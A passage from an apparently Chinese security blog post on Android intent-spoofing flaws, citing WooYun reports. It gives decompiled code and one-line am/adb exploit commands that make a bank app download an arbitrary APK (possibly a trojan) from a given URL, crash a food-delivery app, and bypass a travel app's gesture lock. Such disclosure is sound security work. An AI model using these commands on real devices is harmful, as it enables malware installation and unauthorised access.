+<h4 id="江苏银行手机银行下载安装任意apk（可木马）"><a href="#江苏银行手机银行下载安装任意apk（可木马）" class="headerlink" title="江苏银行手机银行下载安装任意apk（可木马）"></a>江苏银行手机银行下载安装任意apk（可木马）</h4><p><a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-0104992">http://www.wooyun.org/bugs/wooyun-2010-0104992</a></p>
+<p>AndroidManifest.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">&quot;.UpdateService&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;cn.jsb.china.UpdateService&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>UpdateService.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">onStartCommand</span><span class="params">(Intent arg6, <span class="type">int</span> arg7, <span class="type">int</span> arg8)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">Bundle</span> <span class="variable">v0</span> <span class="operator">=</span> arg6.getExtras();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(v0 != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.a = v0.getBoolean(<span class="string">&quot;isupdate&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.b = arg6.getStringExtra(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.c = <span class="built_in">this</span>.getSystemService(<span class="string">&quot;notification&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.d = <span class="keyword">new</span> <span class="title class_">Notification</span>();</span><br><span class="line">    <span class="built_in">this</span>.d.icon = <span class="number">17301633</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">this</span>.a) &#123;</span><br><span class="line">        <span class="built_in">this</span>.i = <span class="keyword">new</span> <span class="title class_">RemoteViews</span>(<span class="built_in">this</span>.getPackageName(), <span class="number">2130903048</span>);</span><br><span class="line">        <span class="built_in">this</span>.d.tickerText = <span class="string">&quot;正在下载江苏银行&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.i = <span class="keyword">new</span> <span class="title class_">RemoteViews</span>(<span class="built_in">this</span>.getPackageName(), <span class="number">2130903043</span>);</span><br><span class="line">        <span class="built_in">this</span>.d.tickerText = <span class="string">&quot;正在下载手机证券&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.d.when = System.currentTimeMillis();</span><br><span class="line">    <span class="built_in">this</span>.d.flags |= <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">this</span>.d.flags |= <span class="number">32</span>;</span><br><span class="line">    <span class="built_in">this</span>.d.defaults = <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">this</span>.d.contentView = <span class="built_in">this</span>.i;</span><br><span class="line">    <span class="built_in">this</span>.d.setLatestEventInfo(((Context)<span class="built_in">this</span>), <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, PendingIntent.getActivity(((Context)<span class="built_in">this</span>), </span><br><span class="line">            <span class="number">0</span>, arg6, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.c.notify(<span class="built_in">this</span>.j, <span class="built_in">this</span>.d);</span><br><span class="line">    <span class="built_in">this</span>.g = <span class="keyword">new</span> <span class="title class_">jn</span>(<span class="built_in">this</span>, Looper.myLooper(), ((Context)<span class="built_in">this</span>));</span><br><span class="line">    <span class="built_in">this</span>.g.sendMessage(<span class="built_in">this</span>.g.obtainMessage(<span class="number">3</span>, Integer.valueOf(<span class="number">0</span>)));</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">jm</span>(<span class="built_in">this</span>, <span class="built_in">this</span>.b).start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.onStartCommand(arg6, arg7, arg8);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am startservice -n cn.jsb.china/.UpdateService --ez isupdate <span class="literal">true</span> --es url http://192.168.102.204/mijian_2.5.1_272.apk</span><br></pre></td></tr></table></figure>
+
+<h4 id="美团外卖客户端本地拒绝服务漏洞"><a href="#美团外卖客户端本地拒绝服务漏洞" class="headerlink" title="美团外卖客户端本地拒绝服务漏洞"></a>美团外卖客户端本地拒绝服务漏洞</h4><p><a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-0106580">http://www.wooyun.org/bugs/wooyun-2010-0106580</a></p>
+<p>利用代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am startservice -n com.sankuai.meituan.takeoutnew/com.sankuai.mtmp.service.MtmpService</span><br></pre></td></tr></table></figure>
+
+<h4 id="航旅纵横手势锁轻易绕过及其它漏洞"><a href="#航旅纵横手势锁轻易绕过及其它漏洞" class="headerlink" title="航旅纵横手势锁轻易绕过及其它漏洞"></a>航旅纵横手势锁轻易绕过及其它漏洞</h4><p><a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-0111692">http://www.wooyun.org/bugs/wooyun-2010-0111692</a></p>
+<p>利用代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am start com.umetrip.android.msky.app/com.umetrip.android.msky.activity.MainActivity</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li>[1] <a target="_blank" rel="noopener" href="https://appvigil.co/blog/intent-spoofing-vulnerability-in-android-apps/">Intent Spoofing Vulnerability in Android Apps – OWASP Top 10</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Security/" rel="tag"># Security</a>
+              <a href="/tags/Android/" rel="tag"># Android</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/03/19/anti_sandbox/" rel="prev" title="一些反沙盒的新技术">
+                  <i class="fa fa-angle-left"></i> 一些反沙盒的新技术
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/03/19/Fedora31/" rel="next" title="Fedora31 的几个变化">
+                  Fedora31 的几个变化 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">henices</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
